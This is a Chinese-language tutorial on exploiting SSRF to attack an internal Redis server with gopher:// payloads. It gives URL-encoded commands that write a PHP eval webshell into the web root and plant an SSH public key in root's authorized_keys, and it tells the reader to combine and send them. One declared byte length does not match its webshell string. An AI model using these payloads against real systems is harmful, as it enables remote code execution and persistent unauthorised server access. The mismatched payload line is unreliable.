### SSRF 如何攻击内网服务

**1. 判断内网Redis端口是否开放**

首先，我们需要确认目标服务器的内网中是否存在 Redis 服务，以及它监听的端口。Redis 的默认端口是 **6379**

我们可以使用 SSRF 漏洞，尝试向 `http://127.0.0.1:6379/` 发起请求。如果请求有响应或返回连接成功的提示，那么Redis 服务可能存在

**2. 构造Redis命令**

Redis的通信协议（RESP，Redis Serialization Protocol）是一种基于TCP的文本协议。攻击者需要将Redis命令转换为符合该协议的格式

例如，一个简单的`INFO`命令的RESP格式如下：

```
*1
$4
INFO
```

- **`\*1`**：表示这是一个包含 1 个命令参数的数组
- **`$4`**：表示接下来的参数有 4 个字节
- **`INFO`**：参数的具体内容

在 Gopher 协议中，换行符需要转换为 URL 编码，即`%0D%0A`（回车换行）。因此，上述命令转换为 Gopher 协议的 URL编码后是： `gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A`

**3. 写入WebShell**

这是最常见的攻击方式，尤其是在目标服务器是 Web 服务器的情况下。攻击者可以利用 Redis 的持久化功能，将WebShell 代码写入到服务器的网站根目录，从而获得服务器的控制权

**攻击思路：**

1. **设置 Redis 的 `dir` 和 `dbfilename`**：将 Redis 的持久化目录设置为网站根目录，将持久化文件名设置为一个WebShell 文件名（如 `shell.php`）。
2. **写入 WebShell 代码**：利用 Redis 的 `SET` 命令，将 WebShell 代码写入一个键中
3. **执行 `SAVE` 或 `BGSAVE`**：执行 `SAVE` 命令将数据保存到指定的 WebShell 文件中

**Gopher Payload 构造举例（以写入PHP一句话木马为例）：**

**PHP 一句话木马代码：** `<?php eval($_POST[cmd]);?>`

1. **设置文件目录**：`config set dir /var/www/html/` **Gopher Payload:** `gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$14%0D%0A/var/www/html/%0D%0A`
2. **设置文件名**：`config set dbfilename shell.php` **Gopher Payload:** `gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A`
3. **设置键值**：`set 1 '<?php eval($_POST[cmd]);?>'` **Gopher Payload:** `gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$27%0D%0A%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%3f%3e%0D%0A`
4. **执行保存**：`save` **Gopher Payload:** `gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0Asave%0D%0A`

你可以将上述 Payload 组合起来，并进行 URL 编码，通过 SSRF 漏洞一次性发送

**4. 写入 SSH 公钥**

如果 Redis 服务是以 root 权限运行，并且目标服务器开放了 SSH 服务，攻击者还可以通过 Redis 将 SSH 公钥写入 root 用户的 `.ssh/authorized_keys` 文件，从而实现 SSH 免密登录

**Gopher Payload 构造举例：**

1. 设置文件目录：`config set dir /root/.ssh/`
2. 设置文件名：`config set dbfilename authorized_keys`
3. 写入SSH公钥：`set 1 'ssh-rsa AAAA...your-pubkey...'`
4. 执行保存：`save`